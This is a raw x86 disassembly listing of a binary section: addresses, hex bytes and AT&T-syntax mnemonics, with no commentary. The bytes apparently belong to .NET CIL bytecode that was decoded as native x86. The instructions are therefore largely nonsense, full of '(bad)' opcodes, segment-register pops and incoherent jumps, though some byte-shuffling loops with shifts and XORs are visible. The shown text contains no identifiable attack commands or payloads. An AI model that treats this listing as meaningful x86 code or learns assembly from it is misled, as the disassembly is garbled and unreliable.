  4036ea:	00 5f 1f             	add    %bl,0x1f(%edi)
  4036ed:	10 64 d2 9c          	adc    %ah,-0x64(%edx,%edx,8)
  4036f1:	08 11                	or     %dl,(%ecx)
  4036f3:	0a 19                	or     (%ecx),%bl
  4036f5:	58                   	pop    %eax
  4036f6:	11 10                	adc    %edx,(%eax)
  4036f8:	20 00                	and    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	ff 5f 1f             	lcall  *0x1f(%edi)
  4036ff:	18 64 d2 9c          	sbb    %ah,-0x64(%edx,%edx,8)
  403703:	11 08                	adc    %ecx,(%eax)
  403705:	17                   	pop    %ss
  403706:	58                   	pop    %eax
  403707:	13 08                	adc    (%eax),%ecx
  403709:	11 08                	adc    %ecx,(%eax)
  40370b:	07                   	pop    %es
  40370c:	3f                   	aas
  40370d:	81 fe ff ff 08 80    	cmp    $0x8008ffff,%esi
  403713:	16                   	push   %ss
  403714:	00 00                	add    %al,(%eax)
  403716:	04 2a                	add    $0x2a,%al
  403718:	1b 30                	sbb    (%eax),%esi
  40371a:	03 00                	add    (%eax),%eax
  40371c:	6a 00                	push   $0x0
  40371e:	00 00                	add    %al,(%eax)
  403720:	08 00                	or     %al,(%eax)
  403722:	00 11                	add    %dl,(%ecx)
  403724:	14 0a                	adc    $0xa,%al
  403726:	28 1f                	sub    %bl,(%edi)
  403728:	00 00                	add    %al,(%eax)
  40372a:	06                   	push   %es
  40372b:	39 0b                	cmp    %ecx,(%ebx)
  40372d:	00 00                	add    %al,(%eax)
  40372f:	00 73 3d             	add    %dh,0x3d(%ebx)
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 0a                	or     (%edx),%cl
  403736:	38 51 00             	cmp    %dl,0x0(%ecx)
  403739:	00 00                	add    %al,(%eax)
  40373b:	00 73 3e             	add    %dh,0x3e(%ebx)
  40373e:	00 00                	add    %al,(%eax)
  403740:	0a 0a                	or     (%edx),%cl
  403742:	dd 45 00             	fldl   0x0(%ebp)
  403745:	00 00                	add    %al,(%eax)
  403747:	26 72 2c             	es jb  0x403776
  40374a:	01 00                	add    %eax,(%eax)
  40374c:	70 72                	jo     0x4037c0
  40374e:	cb                   	lret
  40374f:	01 00                	add    %eax,(%eax)
  403751:	70 28                	jo     0x40377b
  403753:	3f                   	aas
  403754:	00 00                	add    %al,(%eax)
  403756:	0a 6f 40             	or     0x40(%edi),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	0a 74 40 00          	or     0x0(%eax,%eax,2),%dh
  40375f:	00 01                	add    %al,(%ecx)
  403761:	0a dd                	or     %ch,%bl
  403763:	20 00                	and    %al,(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	26 72 37             	es jb  0x4037a1
  40376a:	02 00                	add    (%eax),%al
  40376c:	70 72                	jo     0x4037e0
  40376e:	cb                   	lret
  40376f:	01 00                	add    %eax,(%eax)
  403771:	70 28                	jo     0x40379b
  403773:	3f                   	aas
  403774:	00 00                	add    %al,(%eax)
  403776:	0a 6f 40             	or     0x40(%edi),%ch
  403779:	00 00                	add    %al,(%eax)
  40377b:	0a 74 40 00          	or     0x0(%eax,%eax,2),%dh
  40377f:	00 01                	add    %al,(%ecx)
  403781:	0a dd                	or     %ch,%bl
  403783:	00 00                	add    %al,(%eax)
  403785:	00 00                	add    %al,(%eax)
  403787:	dd 00                	fldl   (%eax)
  403789:	00 00                	add    %al,(%eax)
  40378b:	00 06                	add    %al,(%esi)
  40378d:	2a 00                	sub    (%eax),%al
  40378f:	00 01                	add    %al,(%ecx)
  403791:	1c 00                	sbb    $0x0,%al
  403793:	00 00                	add    %al,(%eax)
  403795:	00 24 00             	add    %ah,(%eax,%eax,1)
  403798:	1f                   	pop    %ds
  403799:	43                   	inc    %ebx
  40379a:	00 20                	add    %ah,(%eax)
  40379c:	14 00                	adc    $0x0,%al
  40379e:	00 01                	add    %al,(%ecx)
  4037a0:	00 00                	add    %al,(%eax)
  4037a2:	18 00                	sbb    %al,(%eax)
  4037a4:	0b 23                	or     (%ebx),%esp
  4037a6:	00 45 14             	add    %al,0x14(%ebp)
  4037a9:	00 00                	add    %al,(%eax)
  4037ab:	01 1b                	add    %ebx,(%ebx)
  4037ad:	30 02                	xor    %al,(%edx)
  4037af:	00 2e                	add    %ch,(%esi)
  4037b1:	00 00                	add    %al,(%eax)
  4037b3:	00 00                	add    %al,(%eax)
  4037b5:	00 00                	add    %al,(%eax)
  4037b7:	00 73 41             	add    %dh,0x41(%ebx)
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	0a 26                	or     (%esi),%ah
  4037be:	dd 0c 00             	fisttpll (%eax,%eax,1)
  4037c1:	00 00                	add    %al,(%eax)
  4037c3:	26 17                	es pop %ss
  4037c5:	80 0e 00             	orb    $0x0,(%esi)
  4037c8:	00 04 dd 16 00 00 00 	add    %al,0x16(,%ebx,8)
  4037cf:	00 28                	add    %ch,(%eax)
  4037d1:	42                   	inc    %edx
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	0a 80 0e 00 00 04    	or     0x400000e(%eax),%al
  4037da:	dd 06                	fldl   (%esi)
  4037dc:	00 00                	add    %al,(%eax)
  4037de:	00 26                	add    %ah,(%esi)
  4037e0:	dd 00                	fldl   (%eax)
  4037e2:	00 00                	add    %al,(%eax)
  4037e4:	00 2a                	add    %ch,(%edx)
  4037e6:	00 00                	add    %al,(%eax)
  4037e8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4037eb:	00 00                	add    %al,(%eax)
  4037ed:	00 00                	add    %al,(%eax)
  4037ef:	00 0b                	add    %cl,(%ebx)
  4037f1:	0b 00                	or     (%eax),%eax
  4037f3:	0c 14                	or     $0x14,%al
  4037f5:	00 00                	add    %al,(%eax)
  4037f7:	01 00                	add    %eax,(%eax)
  4037f9:	00 18                	add    %bl,(%eax)
  4037fb:	00 0f                	add    %cl,(%edi)
  4037fd:	27                   	daa
  4037fe:	00 06                	add    %al,(%esi)
  403800:	14 00                	adc    $0x0,%al
  403802:	00 01                	add    %al,(%ecx)
  403804:	76 28                	jbe    0x40382e
  403806:	1f                   	pop    %ds
  403807:	00 00                	add    %al,(%eax)
  403809:	06                   	push   %es
  40380a:	3a 0c 00             	cmp    (%eax,%eax,1),%cl
  40380d:	00 00                	add    %al,(%eax)
  40380f:	73 41                	jae    0x403852
  403811:	00 00                	add    %al,(%eax)
  403813:	0a 02                	or     (%edx),%al
  403815:	28 43 00             	sub    %al,0x0(%ebx)
  403818:	00 0a                	add    %cl,(%edx)
  40381a:	2a 02                	sub    (%edx),%al
  40381c:	28 19                	sub    %bl,(%ecx)
  40381e:	00 00                	add    %al,(%eax)
  403820:	06                   	push   %es
  403821:	2a 00                	sub    (%eax),%al
  403823:	00 13                	add    %dl,(%ebx)
  403825:	30 05 00 38 00 00    	xor    %al,0x3800
  40382b:	00 09                	add    %cl,(%ecx)
  40382d:	00 00                	add    %al,(%eax)
  40382f:	11 38                	adc    %edi,(%eax)
  403831:	2b 00                	sub    (%eax),%eax
  403833:	00 00                	add    %al,(%eax)
  403835:	04 05                	add    $0x5,%al
  403837:	8e 69 42             	mov    0x42(%ecx),%gs
  40383a:	06                   	push   %es
  40383b:	00 00                	add    %al,(%eax)
  40383d:	00 04 38             	add    %al,(%eax,%edi,1)
  403840:	03 00                	add    (%eax),%eax
  403842:	00 00                	add    %al,(%eax)
  403844:	05 8e 69 0a 03       	add    $0x30a698e,%eax
  403849:	05 16 06 6f 44       	add    $0x446f0616,%eax
  40384e:	00 00                	add    %al,(%eax)
  403850:	0a 26                	or     (%esi),%ah
  403852:	02 05 16 06 28 26    	add    0x26280616,%al
  403858:	00 00                	add    %al,(%eax)
  40385a:	06                   	push   %es
  40385b:	04 06                	add    $0x6,%al
  40385d:	59                   	pop    %ecx
  40385e:	10 02                	adc    %al,(%edx)
  403860:	04 16                	add    $0x16,%al
  403862:	42                   	inc    %edx
  403863:	ce                   	into
  403864:	ff                   	(bad)
  403865:	ff                   	(bad)
  403866:	ff 2a                	ljmp   *(%edx)
  403868:	36 02 03             	add    %ss:(%ebx),%al
  40386b:	04 05                	add    $0x5,%al
  40386d:	03 04 6f             	add    (%edi,%ebp,2),%eax
  403870:	45                   	inc    %ebp
  403871:	00 00                	add    %al,(%eax)
  403873:	0a 26                	or     (%esi),%ah
  403875:	2a 00                	sub    (%eax),%al
  403877:	00 13                	add    %dl,(%ebx)
  403879:	30 05 00 5a 00 00    	xor    %al,0x5a00
  40387f:	00 0a                	add    %cl,(%edx)
  403881:	00 00                	add    %al,(%eax)
  403883:	11 16                	adc    %edx,(%esi)
  403885:	0a 38                	or     (%eax),%bh
  403887:	4a                   	dec    %edx
  403888:	00 00                	add    %al,(%eax)
  40388a:	00 05 6f 46 00 00    	add    %al,0x466f
  403890:	0a 04 06             	or     (%esi,%eax,1),%al
  403893:	1f                   	pop    %ds
  403894:	28 5a 1e             	sub    %bl,0x1e(%edx)
  403897:	58                   	pop    %eax
  403898:	6a 58                	push   $0x58
  40389a:	6f                   	outsl  %ds:(%esi),(%dx)
  40389b:	47                   	inc    %edi
  40389c:	00 00                	add    %al,(%eax)
  40389e:	0a 05 6f 48 00 00    	or     0x486f,%al
  4038a4:	0a 0b                	or     (%ebx),%cl
  4038a6:	05 6f 48 00 00       	add    $0x486f,%eax
  4038ab:	0a 0c 05 6f 48 00 00 	or     0x486f(,%eax,1),%cl
  4038b2:	0a 26                	or     (%esi),%ah
  4038b4:	05 6f 48 00 00       	add    $0x486f,%eax
  4038b9:	0a 0d 08 02 42 0f    	or     0xf420208,%cl
  4038bf:	00 00                	add    %al,(%eax)
  4038c1:	00 02                	add    %al,(%edx)
  4038c3:	08 07                	or     %al,(%edi)
  4038c5:	58                   	pop    %eax
  4038c6:	41                   	inc    %ecx
  4038c7:	06                   	push   %es
  4038c8:	00 00                	add    %al,(%eax)
  4038ca:	00 09                	add    %cl,(%ecx)
  4038cc:	02 58 08             	add    0x8(%eax),%bl
  4038cf:	59                   	pop    %ecx
  4038d0:	2a 06                	sub    (%esi),%al
  4038d2:	17                   	pop    %ss
  4038d3:	58                   	pop    %eax
  4038d4:	0a 06                	or     (%esi),%al
  4038d6:	03 3f                	add    (%edi),%edi
  4038d8:	af                   	scas   %es:(%edi),%eax
  4038d9:	ff                   	(bad)
  4038da:	ff                   	(bad)
  4038db:	ff 16                	call   *(%esi)
  4038dd:	2a 00                	sub    (%eax),%al
  4038df:	00 1b                	add    %bl,(%ebx)
  4038e1:	30 06                	xor    %al,(%esi)
  4038e3:	00 99 04 00 00 0b    	add    %bl,0xb000004(%ecx)
  4038e9:	00 00                	add    %al,(%eax)
  4038eb:	11 02                	adc    %eax,(%edx)
  4038ed:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4038f0:	00 0a                	add    %cl,(%edx)
  4038f2:	0a 7e 10             	or     0x10(%esi),%bh
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	04 3a                	add    $0x3a,%al
  4038f9:	64 02 00             	add    %fs:(%eax),%al
  4038fc:	00 7e 11             	add    %bh,0x11(%esi)
  4038ff:	00 00                	add    %al,(%eax)
  403901:	04 0c                	add    $0xc,%al
  403903:	16                   	push   %ss
  403904:	0d 08 12 03 28       	or     $0x28031208,%eax
  403909:	49                   	dec    %ecx
  40390a:	00 00                	add    %al,(%eax)
  40390c:	0a 73 4a             	or     0x4a(%ebx),%dh
  40390f:	00 00                	add    %al,(%eax)
  403911:	0a 13                	or     (%ebx),%dl
  403913:	04 d0                	add    $0xd0,%al
  403915:	0c 00                	or     $0x0,%al
  403917:	00 02                	add    %al,(%edx)
  403919:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	6f                   	outsl  %ds:(%esi),(%dx)
  40391f:	35 00 00 0a 72       	xor    $0x720a0000,%eax
  403924:	d6                   	salc
  403925:	02 00                	add    (%eax),%al
  403927:	70 6f                	jo     0x403998
  403929:	4b                   	dec    %ebx
  40392a:	00 00                	add    %al,(%eax)
  40392c:	0a 73 4c             	or     0x4c(%ebx),%dh
  40392f:	00 00                	add    %al,(%eax)
  403931:	0a 25 6f 46 00 00    	or     0x466f,%ah
  403937:	0a 16                	or     (%esi),%dl
  403939:	6a 6f                	push   $0x6f
  40393b:	47                   	inc    %edi
  40393c:	00 00                	add    %al,(%eax)
  40393e:	0a 25 25 6f 46 00    	or     0x466f25,%ah
  403944:	00 0a                	add    %cl,(%edx)
  403946:	6f                   	outsl  %ds:(%esi),(%dx)
  403947:	4d                   	dec    %ebp
  403948:	00 00                	add    %al,(%eax)
  40394a:	0a 69 6f             	or     0x6f(%ecx),%ch
  40394d:	4e                   	dec    %esi
  40394e:	00 00                	add    %al,(%eax)
  403950:	0a 13                	or     (%ebx),%dl
  403952:	05 6f 4f 00 00       	add    $0x4f6f,%eax
  403957:	0a 11                	or     (%ecx),%dl
  403959:	05 8e 39 e8 01       	add    $0x1e8398e,%eax
  40395e:	00 00                	add    %al,(%eax)
  403960:	11 05 8e 69 1a 5d    	adc    %eax,0x5d1a698e
  403966:	13 06                	adc    (%esi),%eax
  403968:	11 05 8e 69 1a 5b    	adc    %eax,0x5b1a698e
  40396e:	13 07                	adc    (%edi),%eax
  403970:	11 05 8e 69 8d 1d    	adc    %eax,0x1d8d698e
  403976:	00 00                	add    %al,(%eax)
  403978:	01 13                	add    %edx,(%ebx)
  40397a:	08 16                	or     %dl,(%esi)
  40397c:	13 09                	adc    (%ecx),%ecx
  40397e:	16                   	push   %ss
  40397f:	13 0a                	adc    (%edx),%ecx
  403981:	11 06                	adc    %eax,(%esi)
  403983:	16                   	push   %ss
  403984:	3e 06                	ds push %es
  403986:	00 00                	add    %al,(%eax)
  403988:	00 11                	add    %dl,(%ecx)
  40398a:	07                   	pop    %es
  40398b:	17                   	pop    %ss
  40398c:	58                   	pop    %eax
  40398d:	13 07                	adc    (%edi),%eax
  40398f:	16                   	push   %ss
  403990:	13 0b                	adc    (%ebx),%ecx
  403992:	16                   	push   %ss
  403993:	13 0e                	adc    (%esi),%ecx
  403995:	38 4d 01             	cmp    %cl,0x1(%ebp)
  403998:	00 00                	add    %al,(%eax)
  40399a:	11 0e                	adc    %ecx,(%esi)
  40399c:	1a 5a 13             	sbb    0x13(%edx),%bl
  40399f:	0f 20 ff             	mov    %cr7,%edi
  4039a2:	00 00                	add    %al,(%eax)
  4039a4:	00 13                	add    %dl,(%ebx)
  4039a6:	10 16                	adc    %dl,(%esi)
  4039a8:	13 11                	adc    (%ecx),%edx
  4039aa:	11 0e                	adc    %ecx,(%esi)
  4039ac:	11 07                	adc    %eax,(%edi)
  4039ae:	17                   	pop    %ss
  4039af:	59                   	pop    %ecx
  4039b0:	40                   	inc    %eax
  4039b1:	46                   	inc    %esi
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	00 11                	add    %dl,(%ecx)
  4039b6:	06                   	push   %es
  4039b7:	16                   	push   %ss
  4039b8:	3e 3e 00 00          	ds add %al,%ds:(%eax)
  4039bc:	00 16                	add    %dl,(%esi)
  4039be:	13 0a                	adc    (%edx),%ecx
  4039c0:	16                   	push   %ss
  4039c1:	13 12                	adc    (%edx),%edx
  4039c3:	38 25 00 00 00 11    	cmp    %ah,0x11000000
  4039c9:	12 16                	adc    (%esi),%dl
  4039cb:	3e 06                	ds push %es
  4039cd:	00 00                	add    %al,(%eax)
  4039cf:	00 11                	add    %dl,(%ecx)
  4039d1:	0a 1e                	or     (%esi),%bl
  4039d3:	62 13                	bound  %edx,(%ebx)
  4039d5:	0a 11                	or     (%ecx),%dl
  4039d7:	0a 11                	or     (%ecx),%dl
  4039d9:	05 11 05 8e 69       	add    $0x698e0511,%eax
  4039de:	17                   	pop    %ss
  4039df:	11 12                	adc    %edx,(%edx)
  4039e1:	58                   	pop    %eax
  4039e2:	59                   	pop    %ecx
  4039e3:	91                   	xchg   %eax,%ecx
  4039e4:	60                   	pusha
  4039e5:	13 0a                	adc    (%edx),%ecx
  4039e7:	11 12                	adc    %edx,(%edx)
  4039e9:	17                   	pop    %ss
  4039ea:	58                   	pop    %eax
  4039eb:	13 12                	adc    (%edx),%edx
  4039ed:	11 12                	adc    %edx,(%edx)
  4039ef:	11 06                	adc    %eax,(%esi)
  4039f1:	3f                   	aas
  4039f2:	d2 ff                	sar    %cl,%bh
  4039f4:	ff                   	(bad)
  4039f5:	ff                   	(bad)
  4039f6:	38 2b                	cmp    %ch,(%ebx)
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	00 11                	add    %dl,(%ecx)
  4039fc:	0f 13 0b             	movlps %xmm1,(%ebx)
  4039ff:	11 05 11 0b 19 58    	adc    %eax,0x58190b11
  403a05:	91                   	xchg   %eax,%ecx
  403a06:	1f                   	pop    %ds
  403a07:	18 62 11             	sbb    %ah,0x11(%edx)
  403a0a:	05 11 0b 18 58       	add    $0x58180b11,%eax
  403a0f:	91                   	xchg   %eax,%ecx
  403a10:	1f                   	pop    %ds
  403a11:	10 62 60             	adc    %ah,0x60(%edx)
  403a14:	11 05 11 0b 17 58    	adc    %eax,0x58170b11
  403a1a:	91                   	xchg   %eax,%ecx
  403a1b:	1e                   	push   %ds
  403a1c:	62 60 11             	bound  %esp,0x11(%eax)
  403a1f:	05 11 0b 91 60       	add    $0x60910b11,%eax
  403a24:	13 0a                	adc    (%edx),%ecx
  403a26:	11 09                	adc    %ecx,(%ecx)
  403a28:	13 09                	adc    (%ecx),%ecx
  403a2a:	11 09                	adc    %ecx,(%ecx)
  403a2c:	11 09                	adc    %ecx,(%ecx)
  403a2e:	28 2b                	sub    %ch,(%ebx)
  403a30:	00 00                	add    %al,(%eax)
  403a32:	06                   	push   %es
  403a33:	58                   	pop    %eax
  403a34:	13 09                	adc    (%ecx),%ecx
  403a36:	11 0e                	adc    %ecx,(%esi)
  403a38:	11 07                	adc    %eax,(%edi)
  403a3a:	17                   	pop    %ss
  403a3b:	59                   	pop    %ecx
  403a3c:	40                   	inc    %eax
  403a3d:	53                   	push   %ebx
  403a3e:	00 00                	add    %al,(%eax)
  403a40:	00 11                	add    %dl,(%ecx)
  403a42:	06                   	push   %es
  403a43:	16                   	push   %ss
  403a44:	3e 4b                	ds dec %ebx
  403a46:	00 00                	add    %al,(%eax)
  403a48:	00 11                	add    %dl,(%ecx)
  403a4a:	09 11                	or     %edx,(%ecx)
  403a4c:	0a 61 13             	or     0x13(%ecx),%ah
  403a4f:	13 16                	adc    (%esi),%edx
  403a51:	13 14 38             	adc    (%eax,%edi,1),%edx
  403a54:	2e 00 00             	add    %al,%cs:(%eax)
  403a57:	00 11                	add    %dl,(%ecx)
  403a59:	14 16                	adc    $0x16,%al
  403a5b:	3e 0c 00             	ds or  $0x0,%al
  403a5e:	00 00                	add    %al,(%eax)
  403a60:	11 10                	adc    %edx,(%eax)
  403a62:	1e                   	push   %ds
  403a63:	62 13                	bound  %edx,(%ebx)
  403a65:	10 11                	adc    %dl,(%ecx)
  403a67:	11 1e                	adc    %ebx,(%esi)
  403a69:	58                   	pop    %eax
  403a6a:	13 11                	adc    (%ecx),%edx
  403a6c:	11 08                	adc    %ecx,(%eax)
  403a6e:	11 0f                	adc    %ecx,(%edi)
  403a70:	11 14 58             	adc    %edx,(%eax,%ebx,2)
  403a73:	11 13                	adc    %edx,(%ebx)
  403a75:	11 10                	adc    %edx,(%eax)
  403a77:	5f                   	pop    %edi
  403a78:	11 11                	adc    %edx,(%ecx)
  403a7a:	1f                   	pop    %ds
  403a7b:	1f                   	pop    %ds
  403a7c:	5f                   	pop    %edi
  403a7d:	64 d2 9c 11 14 17 58 	rcrb   %cl,%fs:0x13581714(%ecx,%edx,1)
  403a84:	13 
  403a85:	14 11                	adc    $0x11,%al
  403a87:	14 11                	adc    $0x11,%al
  403a89:	06                   	push   %es
  403a8a:	3f                   	aas
  403a8b:	c9                   	leave
  403a8c:	ff                   	(bad)
  403a8d:	ff                   	(bad)
  403a8e:	ff                   	(bad)
  403a8f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  403a92:	00 00                	add    %al,(%eax)
  403a94:	11 09                	adc    %ecx,(%ecx)
  403a96:	11 0a                	adc    %ecx,(%edx)
  403a98:	61                   	popa
  403a99:	13 15 11 08 11 0f    	adc    0xf110811,%edx
  403a9f:	11 15 20 ff 00 00    	adc    %edx,0xff20
  403aa5:	00 5f d2             	add    %bl,-0x2e(%edi)
  403aa8:	9c                   	pushf
  403aa9:	11 08                	adc    %ecx,(%eax)
  403aab:	11 0f                	adc    %ecx,(%edi)
  403aad:	17                   	pop    %ss
  403aae:	58                   	pop    %eax
  403aaf:	11 15 20 00 ff 00    	adc    %edx,0xff0020
  403ab5:	00 5f 1e             	add    %bl,0x1e(%edi)
  403ab8:	64 d2 9c 11 08 11 0f 	rcrb   %cl,%fs:0x180f1108(%ecx,%edx,1)
  403abf:	18 
  403ac0:	58                   	pop    %eax
  403ac1:	11 15 20 00 00 ff    	adc    %edx,0xff000020
  403ac7:	00 5f 1f             	add    %bl,0x1f(%edi)
  403aca:	10 64 d2 9c          	adc    %ah,-0x64(%edx,%edx,8)
  403ace:	11 08                	adc    %ecx,(%eax)
  403ad0:	11 0f                	adc    %ecx,(%edi)
  403ad2:	19 58 11             	sbb    %ebx,0x11(%eax)
  403ad5:	15 20 00 00 00       	adc    $0x20,%eax
  403ada:	ff 5f 1f             	lcall  *0x1f(%edi)
  403add:	18 64 d2 9c          	sbb    %ah,-0x64(%edx,%edx,8)
  403ae1:	11 0e                	adc    %ecx,(%esi)
  403ae3:	17                   	pop    %ss
  403ae4:	58                   	pop    %eax
  403ae5:	13 0e                	adc    (%esi),%ecx
  403ae7:	11 0e                	adc    %ecx,(%esi)
  403ae9:	11 07                	adc    %eax,(%edi)
  403aeb:	3f                   	aas
  403aec:	aa                   	stos   %al,%es:(%edi)
  403aed:	fe                   	(bad)
  403aee:	ff                   	(bad)
  403aef:	ff 11                	call   *(%ecx)
  403af1:	08 13                	or     %dl,(%ebx)
  403af3:	05 14 13 08 11       	add    $0x11081314,%eax
  403af8:	05 8e 69 1e 5b       	add    $0x5b1e698e,%eax
  403afd:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403b00:	05 73 50 00 00       	add    $0x5073,%eax
  403b05:	0a 73 5a             	or     0x5a(%ebx),%dh
  403b08:	00 00                	add    %al,(%eax)
  403b0a:	06                   	push   %es
  403b0b:	13 0d 16 13 16 38    	adc    0x38161316,%ecx
  403b11:	23 00                	and    (%eax),%eax
  403b13:	00 00                	add    %al,(%eax)
  403b15:	11 0d 6f 5e 00 00    	adc    %ecx,0x5e6f
  403b1b:	06                   	push   %es
  403b1c:	13 17                	adc    (%edi),%edx
  403b1e:	11 0d 6f 5e 00 00    	adc    %ecx,0x5e6f
  403b24:	06                   	push   %es
  403b25:	13 18                	adc    (%eax),%ebx
  403b27:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403b2a:	17                   	pop    %ss
  403b2b:	11 18                	adc    %ebx,(%eax)
  403b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b2e:	51                   	push   %ecx
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	0a 11                	or     (%ecx),%dl
  403b33:	16                   	push   %ss
  403b34:	17                   	pop    %ss
  403b35:	58                   	pop    %eax
  403b36:	13 16                	adc    (%esi),%edx
  403b38:	11 16                	adc    %edx,(%esi)
  403b3a:	11 0c 3f             	adc    %ecx,(%edi,%edi,1)
  403b3d:	d4 ff                	aam    $0xff
  403b3f:	ff                   	(bad)
  403b40:	ff 11                	call   *(%ecx)
  403b42:	0d 6f 5f 00 00       	or     $0x5f6f,%eax
  403b47:	06                   	push   %es
  403b48:	11 04 80             	adc    %eax,(%eax,%eax,4)
  403b4b:	10 00                	adc    %al,(%eax)
  403b4d:	00 04 dd 0d 00 00 00 	add    %al,0xd(,%ebx,8)
  403b54:	09 39                	or     %edi,(%ecx)
  403b56:	06                   	push   %es
  403b57:	00 00                	add    %al,(%eax)
  403b59:	00 08                	add    %cl,(%eax)
  403b5b:	28 52 00             	sub    %dl,0x0(%edx)
  403b5e:	00 0a                	add    %cl,(%edx)
  403b60:	dc 06                	faddl  (%esi)
  403b62:	20 28                	and    %ch,(%eax)
  403b64:	04 00                	add    $0x0,%al
  403b66:	00 6f 53             	add    %ch,0x53(%edi)
  403b69:	00 00                	add    %al,(%eax)
  403b6b:	0a 0b                	or     (%ebx),%cl
  403b6d:	16                   	push   %ss
  403b6e:	13 19                	adc    (%ecx),%ebx
  403b70:	38 fa                	cmp    %bh,%dl
  403b72:	01 00                	add    %eax,(%eax)
  403b74:	00 00                	add    %al,(%eax)
  403b76:	07                   	pop    %es
  403b77:	11 19                	adc    %ebx,(%ecx)
  403b79:	9a 13 1a 11 1a 6f 30 	lcall  $0x306f,$0x1a111a13
  403b80:	00 00                	add    %al,(%eax)
  403b82:	0a 13                	or     (%ebx),%dl
  403b84:	1b 7e 10             	sbb    0x10(%esi),%edi
  403b87:	00 00                	add    %al,(%eax)
  403b89:	04 11                	add    $0x11,%al
  403b8b:	1b 6f 54             	sbb    0x54(%edi),%ebp
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 13                	or     (%ebx),%dl
  403b92:	1c 11                	sbb    $0x11,%al
  403b94:	1c 20                	sbb    $0x20,%al
  403b96:	00 00                	add    %al,(%eax)
  403b98:	00 40 5f             	add    %al,0x5f(%eax)
  403b9b:	16                   	push   %ss
  403b9c:	fe 02                	incb   (%edx)
  403b9e:	13 1d 11 1c 20 ff    	adc    0xff201c11,%ebx
  403ba4:	ff                   	(bad)
  403ba5:	ff                   	(bad)
  403ba6:	3f                   	aas
  403ba7:	5f                   	pop    %edi
  403ba8:	13 1c d0             	adc    (%eax,%edx,8),%ebx
  403bab:	0c 00                	or     $0x0,%al
  403bad:	00 02                	add    %al,(%edx)
  403baf:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403bb2:	00 0a                	add    %cl,(%edx)
  403bb4:	6f                   	outsl  %ds:(%esi),(%dx)
  403bb5:	55                   	push   %ebp
  403bb6:	00 00                	add    %al,(%eax)
  403bb8:	0a 11                	or     (%ecx),%dl
  403bba:	1c 06                	sbb    $0x6,%al
  403bbc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bbd:	56                   	push   %esi
  403bbe:	00 00                	add    %al,(%eax)
  403bc0:	0a 16                	or     (%esi),%dl
  403bc2:	8d 33                	lea    (%ebx),%esi
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	01 6f 57             	add    %ebp,0x57(%edi)
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	0a 74 35 00          	or     0x0(%ebp,%esi,1),%dh
  403bcf:	00 01                	add    %al,(%ecx)
  403bd1:	13 1e                	adc    (%esi),%ebx
  403bd3:	11 1e                	adc    %ebx,(%esi)
  403bd5:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd6:	58                   	pop    %eax
  403bd7:	00 00                	add    %al,(%eax)
  403bd9:	0a 39                	or     (%ecx),%bh
  403bdb:	1b 00                	sbb    (%eax),%eax
  403bdd:	00 00                	add    %al,(%eax)
  403bdf:	11 1a                	adc    %ebx,(%edx)
  403be1:	14 11                	adc    $0x11,%al
  403be3:	1a 6f 59             	sbb    0x59(%edi),%ch
  403be6:	00 00                	add    %al,(%eax)
  403be8:	0a 11                	or     (%ecx),%dl
  403bea:	1e                   	push   %ds
  403beb:	28 32                	sub    %dh,(%edx)
  403bed:	00 00                	add    %al,(%eax)
  403bef:	0a 6f 33             	or     0x33(%edi),%ch
  403bf2:	00 00                	add    %al,(%eax)
  403bf4:	0a dd                	or     %ch,%bl
  403bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf7:	01 00                	add    %eax,(%eax)
  403bf9:	00 11                	add    %dl,(%ecx)
  403bfb:	1e                   	push   %ds
  403bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bfd:	5a                   	pop    %edx
  403bfe:	00 00                	add    %al,(%eax)
  403c00:	0a 13                	or     (%ebx),%dl
  403c02:	1f                   	pop    %ds
  403c03:	11 1f                	adc    %ebx,(%edi)
  403c05:	8e 69 17             	mov    0x17(%ecx),%gs
  403c08:	58                   	pop    %eax
  403c09:	13 20                	adc    (%eax),%esp
  403c0b:	11 20                	adc    %esp,(%eax)
  403c0d:	8d 33                	lea    (%ebx),%esi
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	01 13                	add    %edx,(%ebx)
  403c13:	21 11                	and    %edx,(%ecx)
  403c15:	1e                   	push   %ds
  403c16:	6f                   	outsl  %ds:(%esi),(%dx)
  403c17:	5b                   	pop    %ebx
  403c18:	00 00                	add    %al,(%eax)
  403c1a:	0a 6f 5c             	or     0x5c(%edi),%ch
  403c1d:	00 00                	add    %al,(%eax)
  403c1f:	0a 39                	or     (%ecx),%bh
  403c21:	15 00 00 00 11       	adc    $0x11000000,%eax
  403c26:	21 16                	and    %edx,(%esi)
  403c28:	11 1e                	adc    %ebx,(%esi)
  403c2a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c2b:	5b                   	pop    %ebx
  403c2c:	00 00                	add    %al,(%eax)
  403c2e:	0a 6f 5d             	or     0x5d(%edi),%ch
  403c31:	00 00                	add    %al,(%eax)
  403c33:	0a a2 38 0e 00 00    	or     0xe38(%edx),%ah
  403c39:	00 11                	add    %dl,(%ecx)
  403c3b:	21 16                	and    %edx,(%esi)
  403c3d:	d0 14 00             	rclb   $1,(%eax,%eax,1)
  403c40:	00 01                	add    %al,(%ecx)
  403c42:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403c45:	00 0a                	add    %cl,(%edx)
  403c47:	a2 16 13 24 38       	mov    %al,0x38241316
  403c4c:	17                   	pop    %ss
